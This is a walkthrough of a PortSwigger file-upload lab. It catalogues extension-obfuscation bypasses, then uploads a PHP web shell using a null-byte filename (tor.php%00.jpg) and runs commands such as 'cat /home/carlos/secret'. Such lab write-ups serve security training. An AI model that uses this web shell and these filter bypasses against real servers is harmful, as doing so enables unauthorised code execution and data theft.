## Welcome, my friend. Today we will start the [5. File Upload lab](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension) in ```portswigger```

# Explain this Scenario:

## Obfuscation of file extensions

#### Even the most comprehensive blacklists can be bypassed using classic obfuscation techniques. Let's discuss these methods and add real-life examples to illustrate how to exploit:

### 1. Distortion by case sensitivity

#### If the site verifies extensions using a case-sensitive function, such as the php extension check, a file with the ```pHp``` extension can be uploaded to bypass this check.


### 2. Provide multiple extensions

#### Some servers may only use the first algorithm, causing the ```exploit.php.jpg``` file to be executed as a PHP file.


### 3. Add subsequent characters

#### If the server ignores the last point, a file with ```exploit.php.``` extension can be uploaded. To bypass filters.


### 4. Use URL encoding

#### If the verification system does not decode %2E, but the server does, the ```exploit%2Ephp``` file can be uploaded to be executed as a PHP file.


### 5. Add semicolons or zero bytes encoded in the URL

#### The ```exploit.asp;.jpg``` or ```exploit.asp%00.jpg```  file can bypass checking if a semicolon is considered the end of the file name.


### 6. Use multibyte Unicode characters

##### The ```exploit%C0%2Ephp``` file can bypass checking if xC0 x2E is parsed as a point after normalization.


### Other defenses: Remove or replace dangerous extensions

#### The ```exploit.p.phphp``` file can become a valid file after removing .php as exploit.p.php.

##### These techniques are just a few of the many possible ways to obfuscate file extensions. Feel free to ask for any additional details or clarifications you need!

# Let's play this lab:

#### Let's log in to your own account using the following credentials: ```wiener:peter```

![image](https://github.com/user-attachments/assets/1b7229a1-3813-48f9-b6f0-0dcc0d603e78)


#### Let's create a php malicious payload in file ```tor.php```:

### within tor.php:

```
<?php
    echo system($_GET["tor"]);
?>
```

![image](https://github.com/user-attachments/assets/295203de-7776-489e-b02f-df7db4e826ee)

### Now, Let's upload this malicious payload to server.


![image](https://github.com/user-attachments/assets/25477564-531f-470b-969c-42376ed23c34)

#### Hmm ,Sorry! REALY?

### ok Let's open the burp tool to explore what happen.

![image](https://github.com/user-attachments/assets/9b40afc8-375c-4bcc-ac72-65cb7eb4b69f)


#### Ok, Server want ```jpg``` or ```png``` only and deny ```php```:
#### Change file name to ```tor.php.jpg```


![image](https://github.com/user-attachments/assets/9c7e8251-48d4-4425-a888-0dc988ca0ae9)

![image](https://github.com/user-attachments/assets/477cb046-339c-43da-a0dd-67c940fd7d83)


#### WOW! The file has been uploaded successfully.

### From Task 1, we explore that our file is within this path ```/files/avatars/file_name?parameter=command``` like this:

```
/files/avatars/tor.php.jpg?tor=id
```

![image](https://github.com/user-attachments/assets/517288f7-ad49-4665-a938-3c7f433b14dd)


#### Well, my friend, the server tells us that this image has errors because it does not have image content, but rather contains our malicious file, so we want to evade the image extension.

### We using ```Null Byte``` , We retry upload this file but change file name to ```tor.php%00.jpg```

![image](https://github.com/user-attachments/assets/e71a5b85-0fb3-48b1-a844-79918eb3bbf5)

![image](https://github.com/user-attachments/assets/26aabacd-02fb-437c-9204-51d926d0a6a2)


### Well done! Let's run our file.


```
/files/avatars/tor.php?tor=id
```

![image](https://github.com/user-attachments/assets/21083ab7-6bac-455e-a05f-9b21123055b0)



#### Ok this task requrie reach to /home/carlos/secret file.

```
/files/avatars/tor.php?tor=cat /home/carlos/secret
```

![image](https://github.com/user-attachments/assets/fd63dedf-1118-454f-88e1-609eb4dc3706)


#### alert: this secret is douple, copy single secret only.
### Let's Submit this secret using the button provided in the lab banner.

## Then ...
